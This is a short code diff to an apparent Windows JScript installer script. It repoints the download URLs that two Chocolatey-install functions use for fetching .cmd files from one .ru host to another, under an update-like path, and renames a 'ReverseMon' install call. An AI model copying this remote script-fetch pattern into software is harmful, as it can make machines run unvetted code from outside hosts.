@@ -28,8 +28,8 @@ function ChecksSmartChocolateyInstalled_WinNew()
   var iFlag, strVar;
   var strUrl1, strAuxCmd, strUrl2, strChoco;
   strVar = "ChocolateyInstall";
-  strUrl1 = "http://file.tuneserv.ru/Exponenta/";
-  strUrl2 = "http://file.tuneserv.ru/WinUpdate/WindowsMainUpdate/Other/";
+  strUrl1 = "http://file.netip4.ru/Exponenta/";
+  strUrl2 = "http://file.netip4.ru/WinUpdate/WindowsMainUpdate/Other/";
   strChoco = "chock.install-001.cmd";
   strAuxCmd = "auxiliary.cmd";
   iFlag = CheckIfFolderVariableDefined (strVar);  
@@ -73,8 +73,8 @@ function ForcedPaccketsChocolateyInstalled_WinNew()
   var iFlag, strVar;
   var strUrl1, strAuxCmd, strUrl2, strChoco;
   strVar = "ChocolateyInstall";
-  strUrl1 = "http://file.tuneserv.ru/Exponenta/";
-  strUrl2 = "http://file.tuneserv.ru/WinUpdate/WindowsMainUpdate/Other/";
+  strUrl1 = "http://file.netip4.ru/Exponenta/";
+  strUrl2 = "http://file.netip4.ru/WinUpdate/WindowsMainUpdate/Other/";
   strChoco = "chock.install-001.cmd";
   strAuxCmd = "auxiliary.cmd";
   iFlag = CheckIfFolderVariableDefined (strVar);  
@@ -139,6 +139,6 @@ function NIT_ForceRevMonInstall(){
 	// Devine Variables
 	var iFlag;
 	// To Do
-	iFlag = ReverseMonInstall();
+	iFlag = ForceReverseMonInstall();
 	return iFlag;
 }
